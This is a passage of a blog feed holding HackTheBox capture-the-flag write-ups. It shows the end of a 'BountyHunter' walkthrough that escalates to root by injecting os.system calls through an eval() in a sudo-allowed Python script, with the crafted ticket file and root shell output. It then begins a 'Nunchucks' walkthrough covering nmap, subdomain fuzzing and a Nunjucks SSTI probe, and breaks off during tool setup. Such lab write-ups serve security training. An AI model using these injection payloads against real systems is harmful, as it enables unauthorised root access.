</span></span><span class="line"><span class="cl">-- John
</span></span></code></pre></div><p>This user also has sudo permissions on the mentioned internal tool called <code>ticketValidator.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> development on bountyhunter:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User development may run the following commands on bountyhunter:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</span></span></code></pre></div><h4 id="source-analysis">Source Analysis</h4>
<p><code>ticketValidator.py</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#Skytrain Inc Ticket Validation System 0.1</span>
</span></span><span class="line"><span class="cl"><span class="c1">#Do not distribute this file.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">load_file</span><span class="p">(</span><span class="n">loc</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">loc</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.md&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="n">loc</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Wrong file type.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">evaluate</span><span class="p">(</span><span class="n">ticketFile</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#Evaluates a ticket to check for ireggularities.</span>
</span></span><span class="line"><span class="cl">    <span class="n">code_line</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">x</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ticketFile</span><span class="o">.</span><span class="n">readlines</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;# Skytrain Inc&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;## Ticket to &#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Destination: </span><span class="si">{</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">3</span><span class="p">:])</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;__Ticket Code:__&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">code_line</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">            <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;+&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">validationNumber</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#DEBUG print(ticket)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Valid ticket.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Invalid ticket.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span><span class="o">.</span><span class="n">close</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><p>I&rsquo;m bad at python, but I can see where is the goal from that script, it&rsquo;s this line</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span></code></pre></div><p>So the flow is: ask a file -&gt; load the file (markdown extension) -&gt; some unique evaluation -&gt; eval function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Please enter the path to the ticket file.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span> <span class="o">=</span> <span class="n">load_file</span><span class="p">(</span><span class="n">fileName</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="n">evaluate</span><span class="p">(</span><span class="n">ticket</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Valid ticket.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Invalid ticket.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticket</span><span class="o">.</span><span class="n">close</span>
</span></span></code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>To exploit this script, I can just create a md file, and the first three line are:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl"><span class="gh"># Skytrain Inc
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gu">## Ticket to me
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>__Ticket Code:__
</span></span></code></pre></div><p>Now in the fourth line, I can inject a Python code such as:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">**</span><span class="mi">32</span><span class="o">+</span><span class="mi">0</span><span class="o">==</span><span class="mi">32</span> <span class="ow">and</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat /root/root.txt&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>As long as the number has 4 as the remainder when mod by 7, it can pass these lines and it will be <em>eval</em>-ed and executed as <code>32+0==32 and __import__('os').system('cat /root/root.txt')</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">code_line</span> <span class="ow">and</span> <span class="n">i</span> <span class="o">==</span> <span class="n">code_line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">x</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># [&#34;32&#34;, &#34;0==32 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;)&#34;]</span>
</span></span><span class="line"><span class="cl">    <span class="n">ticketCode</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;+&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="c1"># 32</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">ticketCode</span><span class="p">)</span> <span class="o">%</span> <span class="mi">7</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">validationNumber</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;**&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
</span></span></code></pre></div><blockquote>
<p><code>os.system([command])</code> returns value of 0 if the execution is success.</p>
</blockquote>
<p>The complete file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:/dev/shm$ cat iamf.md
</span></span><span class="line"><span class="cl"><span class="c1"># Skytrain Inc</span>
</span></span><span class="line"><span class="cl"><span class="c1">## Ticket to me</span>
</span></span><span class="line"><span class="cl">__Ticket Code:__
</span></span><span class="line"><span class="cl">**32+0<span class="o">==</span><span class="m">32</span> and __import__<span class="o">(</span><span class="s1">&#39;os&#39;</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">&#39;cat /root/root.txt&#39;</span><span class="o">)</span>
</span></span></code></pre></div><p>Now I can run and supply my ticket file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
</span></span><span class="line"><span class="cl">Please enter the path to the ticket file.
</span></span><span class="line"><span class="cl">iamf.md
</span></span><span class="line"><span class="cl">Destination: me
</span></span><span class="line"><span class="cl">70cfb26382b7af00c95360e142894b1f
</span></span><span class="line"><span class="cl">Invalid ticket.
</span></span></code></pre></div><p>For shell, I can just change the fourth line to execute bash.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl">**32+0==32 and <span class="gs">__import__</span>(&#39;os&#39;).system(&#39;/bin/bash&#39;)
</span></span></code></pre></div><p>And done.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 
</span></span><span class="line"><span class="cl">Please enter the path to the ticket file.
</span></span><span class="line"><span class="cl">iamf.md
</span></span><span class="line"><span class="cl">Destination: me
</span></span><span class="line"><span class="cl">root@bountyhunter:/dev/shm# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@bountyhunter:/dev/shm# ls -l /root/
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jul <span class="m">30</span> 16:38 root.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Apr  <span class="m">5</span> 22:48 snap
</span></span><span class="line"><span class="cl">root@bountyhunter:/dev/shm#
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Nunchucks</title>
      <link>https://fahmifj.github.io/hackthebox/nunchucks/</link>
      <pubDate>Sun, 07 Nov 2021 01:42:05 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/nunchucks/</guid>
      <description>SSTI in Nunjucks and SUID capability on Perl</description>
      <content:encoded><![CDATA[<p>Nunchucks features a NodeJS website that uses <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> as its templating engine. Fuzzing for the hostname reveals another website that is vulnerable to SSTI, which can be exploited to gain initial access to the system. Further enumeration reveals that the Perl binary has the <code>cap_setuid</code> capability set, and this eventually allows me to escalate myself to root.</p>
<p>I really enjoyed the foothold part of this box, so that section might be a bit longer.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Web enumeration</li>
<li>SSTI on Nunjucks</li>
<li>Creating tplmap middleware using Flask</li>
<li>Exploiting <code>cap_setuid</code> on Perl</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Tplmap</li>
<li>Flask</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full TCP scan with <code>nmap</code> reveals 3 open ports: SSH on its default, HTTP and its secure version, HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.11.122 nunchucks
</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.122 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p 22,80,443 -sC -sV -oA nmap/all-tcp-ports-nunchucks 10.10.11.122
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-05 07:12 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.122
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT    STATE SERVICE  VERSION
</span></span><span class="line"><span class="cl">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp  open  http     nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://nunchucks.htb/
</span></span><span class="line"><span class="cl">443/tcp open  ssl/http nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Nunchucks - Landing Page
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>nunchucks.htb/organizationName<span class="o">=</span>Nunchucks-Certificates/stateOrProvinceName<span class="o">=</span>Dorset/countryName<span class="o">=</span>UK
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-08-30T15:42:24
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2031-08-28T15:42:24
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-nextprotoneg: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 16.77 seconds
</span></span></code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="http---https">HTTP -&gt; HTTPS</h3>
<p>For HTTP, nothing interesting in the server response, it has permanent redirection to HTTPS.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ curl -I http://nunchucks.htb/ 
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">301</span> Moved Permanently
</span></span><span class="line"><span class="cl">Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">05</span> Nov <span class="m">2021</span> 11:51:32 GMT
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">178</span>
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Location: https://nunchucks.htb/
</span></span></code></pre></div><h3 id="nunchuckshtb">nunchucks.htb</h3>
<p>On the HTTPS, it&rsquo;s a company site called Nunchucks that offers online shop creation.</p>
<p><div class="img-container"><img src="imgs/image-20211105185410047.png" alt="image-20211105185410047"  /></div>
</p>
<p>At the bottom of the page, there is an email, also it says it will have a store soon.</p>
<p><div class="img-container"><img src="imgs/image-20211105190058511.png" alt="image-20211105190058511"  /></div>
</p>
<p>Opening Wappalyzer reveals it&rsquo;s using Node.js and PHP. I doubt it&rsquo;s PHP since appending <code>.php</code> gives me a 404 error.</p>
<p><div class="img-container"><img src="imgs/image-20211105185340514.png" alt="image-20211105185340514"  /></div>
</p>
<p>The signup button sends me to <code>/signup</code> where a signup form is shown. I will just signup and intercept the request.</p>
<p><div class="img-container"><img src="imgs/image-20211105185906028.png" alt="image-20211105185906028"  /></div>
</p>
<p>I&rsquo;ll send this request to repeater just in case, and then forward it</p>
<p><div class="img-container"><img src="imgs/image-20211105185921036.png" alt="image-20211105185921036"  /></div>
</p>
<p>But then, the returned response states that registration is closed</p>
<p><div class="img-container"><img src="imgs/image-20211105190014496.png" alt="image-20211105190014496"  /></div>
</p>
<p>I changed the endpoint to <code>/api/login</code>, and it returns the same.</p>
<p><div class="img-container"><img src="imgs/image-20211105190246106.png" alt="image-20211105190246106"  /></div>
</p>
<p>Sending a malformed input breaks the parser and leaks the web directory.</p>
<p><div class="img-container"><img src="imgs/image-20211105190735552.png" alt="image-20211105190735552"  /></div>
</p>
<p>Nothing else to try here.</p>
<h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
<p>Fuzzing the Host header reveals a subdomain: <code>store.nunchucks.htb</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ ffuf -k -u https://nunchucks.htb -H <span class="s2">&#34;Host: FUZZ.nunchucks.htb&#34;</span> -mc <span class="m">200</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fl <span class="m">547</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v1.3.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : https://nunchucks.htb
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.nunchucks.htb
</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
</span></span><span class="line"><span class="cl"> :: Filter           : Response lines: <span class="m">547</span>
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">store                   <span class="o">[</span>Status: 200, Size: 4028, Words: 1053, Lines: 102<span class="o">]</span>
</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>4989/4989<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">269</span> req/sec :: Duration: <span class="o">[</span>0:00:22<span class="o">]</span> :: Errors: <span class="m">0</span> ::
</span></span></code></pre></div><p>I&rsquo;ll update my <code>/etc/hosts</code> again.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «nunchucks» «10.10.14.46» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.11.122 store.nunchucks.htb&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><h3 id="storenunchuckshtb">store.nunchucks.htb</h3>
<p>Store is not available, but I can subscribe for newsletter.</p>
<p><div class="img-container"><img src="imgs/image-20211105191702728.png" alt="image-20211105191702728"  /></div>
</p>
<p>When I submit an email address there, it reflects the address back.</p>
<p><div class="img-container"><img src="imgs/image-20211105191708337.png" alt="image-20211105191708337"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="ssti">SSTI</h3>
<h4 id="identify">Identify</h4>
<p>Since I&rsquo;ve got a spoiler from the machine tags and the machine name, I immediately sent the typical <code>{{7*7}}</code> SSTI payload, and <code>49</code> returned in the email address. This means the site is vulnerable.</p>
<p><div class="img-container"><img src="imgs/image-20211105191824204.png" alt="image-20211105191824204"  /></div>
</p>
<blockquote>
<p>The email validation is on client-side.</p>
</blockquote>
<h4 id="creating-middleware-for-tplmap-with-flask">Creating Middleware for tplmap with Flask</h4>
<p>The machine name gives a big spoiler about which templating engine this machine uses (Nunjucks), and there is a nice writeup that shows how to exploit it <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine.">here</a>. But, I&rsquo;d like to let <code>tplmap</code> identify it for me.</p>
<p>Unfortunately, there is no such option in <code>tplmap</code> for sending a request in JSON format. Therefore, I created a simple middleware using Flask which acts as a middleman/proxy that will takes the non-JSON request and convert it before forwarding the request to <code>store.nunchucks.htb</code>. Here&rsquo;s the code:</p>
<script type="application/javascript" src="https://gist.github.com/fahmifj/fad39893ee4ec8636baba2903aee7814.js"></script>

<blockquote>
<p>If you&rsquo;re having trouble with tplmap, maybe this post <a href="https://fahmifj.github.io/blog/tplmap-install/">here</a> could resolve it.</p>
</blockquote>
<p>I&rsquo;ll run the middleware.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.46»
</span></span><span class="line"><span class="cl">$ python3 middleware.py
</span></span><span class="line"><span class="cl"> * Serving Flask app <span class="s2">&#34;middleware&#34;</span> <span class="o">(</span>lazy loading<span class="o">)</span>
